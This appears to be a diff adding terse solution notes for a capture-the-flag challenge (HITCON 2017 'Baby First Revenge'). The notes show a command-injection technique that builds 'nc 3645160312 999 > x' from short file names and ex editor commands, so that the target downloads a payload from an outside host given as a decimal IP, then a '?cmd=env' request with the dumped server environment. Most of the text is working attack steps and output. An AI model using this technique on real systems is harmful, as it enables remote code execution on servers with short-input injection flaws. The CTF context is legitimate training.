@@ -1,0 +1,89 @@
+https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md
+
+Original
+	LANG=en_US.UTF-8
+	LC_ALL=
+
+New
+	export LC_ALL=C LANG=C
+
+nc 3645160312 99 > x
+
+stage 1: create files for the "parts" that we need
+>nc
+>36
+>451
+>60
+>312
+>999
+>\>
+ls>x
+
+cat x
+	312
+	36
+	451
+	60
+	999
+	>
+	nc
+	x
+
+stage 2: 
+
+>2j! # join the 2nd and 3rd line with space, producing 36541 (first part of ip)
+>w   # save the file ("write")
+ls>z # write ex commands into file z
+>ex  # create the ex file for the following command
+*x<z # runs ex x < z to execute `ex` on the file `x` with commands read from `z`
+
+cat x
+	312
+	        36451
+	60
+	999
+	>
+	nc
+	x
+
+>1m3 # move the first line (312, end of ip) to after line 3 (60, part before end of ip)
+# now, 2j! is run to join the second line (312, because first line was moved) with third line (60)
+
+# these commands indent the lines 3 (end of ip), 4 (>) and 6 (x) so that when we join them without space later, 
+# there's still space between them
+>3\>
+>4\>
+>5m0 # move 5th line (nc) to first line
+>6\>
+
+
+ls>z
+*x<z # run ex again
+cat x
+	nc
+	        36451
+	60312
+	        999
+	        >
+	                x
+
+###
+# stage 3: the file is now in the right order, just join them all
+#
+# one problem here is that we already have a lot of ex commands in our working directory,
+# but we don't want to re-execute them. So we use %, which sorts before everything we've used so
+# far, and applies our commands to all lines in the file. %wq saves the changes & q ensures that we quit
+# and do not process any further commands
+
+>%j! # join all lines directly, not adding additional space
+>%wq # write and quit
+
+ls>z
+*x<z # run ex
+
+cat x
+	nc      3645160312      999     >               x
+
+
+http://207.180.200.166:8000/?cmd=env
+	HOSTNAME=c69c4be2536c SHLVL=1 OLDPWD=/home/ctf/code HOME=/home/ctf SERVER_SOFTWARE=gunicorn/19.7.1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PWD=/home/ctf/code/sandbox/1.169.91.216
